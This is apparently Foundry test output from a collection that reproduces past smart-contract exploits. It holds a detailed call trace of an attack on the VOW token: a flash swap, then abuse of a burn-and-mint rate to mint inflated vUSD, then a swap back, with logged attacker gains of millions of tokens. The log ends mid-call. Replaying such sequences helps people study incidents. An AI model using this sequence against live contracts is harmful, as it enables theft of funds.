Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.31s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 379.61ms (425.73µs CPU time)

Ran 1 test for src/test/2024-08/VOW_exp.sol:VOW
[PASS] testExploit() (gas: 559252)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Before exploit VOW balance of attacker:: 0.000000000000000000
  Before exploit USDT balance of attacker:: 0.000000
  Before exploit ETH balance of attacker:: 0.143035110757335249
  After exploit: VOW balance of attacker:: 5801632.714644004917570378
  After exploit: USDT balance of attacker:: 595970.517680
  After exploit: ETH balance of attacker:: 175.620817063726256189
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [704331] VOW::testExploit()
    ├─ [0] VM::deal(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ [2613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3) [staticcall]
    │   └─ ← [Return] 0
    ├─ [271] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Before exploit VOW balance of attacker:", val: 0, decimals: 18)
    ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2484] 0xdAC17F958D2ee523a2206206994597C13D831ec7::decimals() [staticcall]
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "Before exploit USDT balance of attacker:", val: 0, decimals: 6)
    ├─ emit log_named_decimal_uint(key: "Before exploit ETH balance of attacker:", val: 143035110757335249 [1.43e17], decimals: 18)
    ├─ [2613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb) [staticcall]
    │   └─ ← [Return] 1486625296150499360431665 [1.486e24]
    ├─ [417873] 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb::swap(1486625296150499360431664 [1.486e24], 0, VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [45978] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::transfer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1486625296150499360431664 [1.486e24])
    │   │   ├─ [42045] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::b750dc46(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fdeb46b3a0916630f36e886d675602b1007fcbb0000000000000000000000007fdeb46b3a0916630f36e886d675602b1007fcbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000013ace1e68e27d5252de3000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   ├─ emit Sent(operator: 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, from: 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1486625296150499360431664 [1.486e24], data: 0x, operatorData: 0x)
    │   │   │   ├─ emit Transfer(from: 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1486625296150499360431664 [1.486e24])
    │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] true
    │   ├─ [332382] VOW::uniswapV2Call(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1486625296150499360431664 [1.486e24], 0, 0x00)
    │   │   ├─ [36178] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::transfer(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 1486625296150499360431664 [1.486e24])
    │   │   │   ├─ [34745] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::b750dc46(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000048de6bf9e301946b0a32b053804c61dc5f00c0c3000000000000000000000000000000000000000000013ace1e68e27d5252de3000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Sent(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, amount: 1486625296150499360431664 [1.486e24], data: 0x, operatorData: 0x)
    │   │   │   │   ├─ emit Transfer(from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, value: 1486625296150499360431664 [1.486e24])
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] true
    │   │   ├─ [121744] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::transferFrom(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 0x184497031808F2b6A2126886C712CC41f146E5dC, 1486625296150499360431664 [1.486e24])
    │   │   │   ├─ [120802] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::2e6a5609(000000000000000000000000000000000000000000000000000000000000000200000000000000000000000048de6bf9e301946b0a32b053804c61dc5f00c0c3000000000000000000000000184497031808f2b6a2126886c712cc41f146e5dc000000000000000000000000000000000000000000013ace1e68e27d5252de30) [delegatecall]
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Sent(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, to: 0x184497031808F2b6A2126886C712CC41f146E5dC, amount: 1486625296150499360431664 [1.486e24], data: 0x, operatorData: 0x)
    │   │   │   │   ├─ emit Transfer(from: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, to: 0x184497031808F2b6A2126886C712CC41f146E5dC, value: 1486625296150499360431664 [1.486e24])
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x184497031808F2b6A2126886C712CC41f146E5dC, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x184497031808F2b6A2126886C712CC41f146E5dC
    │   │   │   │   ├─ [75895] 0x184497031808F2b6A2126886C712CC41f146E5dC::tokensReceived(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 0x184497031808F2b6A2126886C712CC41f146E5dC, 1486625296150499360431664 [1.486e24], 0x, 0x)
    │   │   │   │   │   ├─ [16985] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::burn(1486625296150499360431664 [1.486e24], 0x)
    │   │   │   │   │   │   ├─ [15403] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::24394467(0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000184497031808f2b6a2126886c712cc41f146e5dc000000000000000000000000184497031808f2b6a2126886c712cc41f146e5dc000000000000000000000000000000000000000000013ace1e68e27d5252de3000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x184497031808F2b6A2126886C712CC41f146E5dC, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   │   │   ├─ emit Burned(operator: 0x184497031808F2b6A2126886C712CC41f146E5dC, from: 0x184497031808F2b6A2126886C712CC41f146E5dC, amount: 1486625296150499360431664 [1.486e24], data: 0x, operatorData: 0x)
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x184497031808F2b6A2126886C712CC41f146E5dC, to: 0x0000000000000000000000000000000000000000, value: 1486625296150499360431664 [1.486e24])
    │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ [2474] 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A::usdRate(1) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ [2518] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::usdRate(0) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ [2474] 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A::usdRate(0) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ [2518] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::usdRate(1) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000064
    │   │   │   │   │   ├─ [38103] 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A::mint(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 148662529615049936043166400 [1.486e26])
    │   │   │   │   │   │   ├─ [35105] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::6eeb9e0f(000000000000000000000000000000000000000000000000000000000000000200000000000000000000000048de6bf9e301946b0a32b053804c61dc5f00c0c30000000000000000000000000000000000000000007af883e0f878f4285ecac0) [delegatecall]
    │   │   │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   │   │   ├─ emit Minted(operator: 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A, to: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, amount: 148662529615049936043166400 [1.486e26], data: 0x, operatorData: 0x)
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, value: 148662529615049936043166400 [1.486e26])
    │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ emit LogBurnAndMint(param0: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, param1: 1486625296150499360431664 [1.486e24], param2: 148662529615049936043166400 [1.486e26])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] true
    │   │   ├─ [569] 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A::balanceOf(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3) [staticcall]
    │   │   │   └─ ← [Return] 148662529615049936043166400 [1.486e26]
    │   │   ├─ [38550] 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A::transferFrom(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 148662529615049936043166400 [1.486e26])
    │   │   │   ├─ [37608] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::2e6a5609(000000000000000000000000000000000000000000000000000000000000000200000000000000000000000048de6bf9e301946b0a32b053804c61dc5f00c0c30000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000007af883e0f878f4285ecac0) [delegatecall]
    │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Sent(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 148662529615049936043166400 [1.486e26], data: 0x, operatorData: 0x)
    │   │   │   │   ├─ emit Transfer(from: 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 148662529615049936043166400 [1.486e26])
    │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2504] 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 74044071314129525824759011 [7.404e25], 89718744180081960362788879 [8.971e25], 1723546487 [1.723e9]
    │   │   ├─ [38024] 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A::transfer(0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb, 148662529615049936043166400 [1.486e26])
    │   │   │   ├─ [8603] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::24394467(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000001f7b030a7d0c883b7c9e600000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Burned(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 2378600473840798976690662 [2.378e24], data: 0x, operatorData: 0x)
    │   │   │   │   ├─ emit Transfer(from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 2378600473840798976690662 [2.378e24])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [17645] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::b750dc46(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000097be09f2523b39b835da9ea3857cfa1d3c660cbb0000000000000000000000000000000000000000007900d3b050a82ba4a700da00000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Sent(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb, amount: 146283929141209137066475738 [1.462e26], data: 0x, operatorData: 0x)
    │   │   │   │   ├─ emit Transfer(from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb, value: 146283929141209137066475738 [1.462e26])
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] true
    │   │   ├─ [569] 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A::balanceOf(0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb) [staticcall]
    │   │   │   └─ ← [Return] 220328000455338662891234749 [2.203e26]
    │   │   ├─ [71483] 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb::swap(0, 59507425738366327370721501 [5.95e25], VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   ├─ [38978] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::transfer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 59507425738366327370721501 [5.95e25])
    │   │   │   │   ├─ [37545] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::b750dc46(000000000000000000000000000000000000000000000000000000000000000200000000000000000000000097be09f2523b39b835da9ea3857cfa1d3c660cbb00000000000000000000000097be09f2523b39b835da9ea3857cfa1d3c660cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000003139300362e62827eea8dd00000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   ├─ emit Sent(operator: 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb, from: 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 59507425738366327370721501 [5.95e25], data: 0x, operatorData: 0x)
    │   │   │   │   │   ├─ emit Transfer(from: 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 59507425738366327370721501 [5.95e25])
    │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [569] 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A::balanceOf(0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb) [staticcall]
    │   │   │   │   └─ ← [Return] 220328000455338662891234749 [2.203e26]
    │   │   │   ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb) [staticcall]
    │   │   │   │   └─ ← [Return] 30211318441715632992067378 [3.021e25]
    │   │   │   ├─ emit Sync(reserve0: 220328000455338662891234749 [2.203e26], reserve1: 30211318441715632992067378 [3.021e25])
    │   │   │   ├─ emit Swap(sender: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 146283929141209137066475738 [1.462e26], amount1In: 0, amount0Out: 0, amount1Out: 59507425738366327370721501 [5.95e25], to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [14278] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::transfer(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, 1491098591926278195017714 [1.491e24])
    │   │   │   ├─ [12845] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::b750dc46(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fdeb46b3a0916630f36e886d675602b1007fcbb000000000000000000000000000000000000000000013bc09ddbfa060b3077f200000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Sent(operator: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, amount: 1491098591926278195017714 [1.491e24], data: 0x, operatorData: 0x)
    │   │   │   │   ├─ emit Transfer(from: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, value: 1491098591926278195017714 [1.491e24])
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb) [staticcall]
    │   │   └─ ← [Return] 1491098591926278195017715 [1.491e24]
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x7FdEB46b3a0916630f36E886D675602b1007Fcbb) [staticcall]
    │   │   └─ ← [Return] 185530201197745898879 [1.855e20]
    │   ├─ emit Sync(reserve0: 1491098591926278195017715 [1.491e24], reserve1: 185530201197745898879 [1.855e20])
    │   ├─ emit Swap(sender: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 1491098591926278195017714 [1.491e24], amount1In: 0, amount0Out: 1486625296150499360431664 [1.486e24], amount1Out: 0, to: VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [613] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::balanceOf(VOW: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 58016327146440049175703787 [5.801e25]
    ├─ [32178] 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb::transfer(0x48de6bF9e301946b0a32b053804c61DC5f00c0c3, 5801632714644004917570378 [5.801e24])
    │   ├─ [30745] 0x60CA4ec4412A3B319F4bD6366bb836395336B397::b750dc46(00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000048de6bf9e301946b0a32b053804c61dc5f00c0c300000000000000000000000000000000000000000004cc8b23c0b1369c796b4a00000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
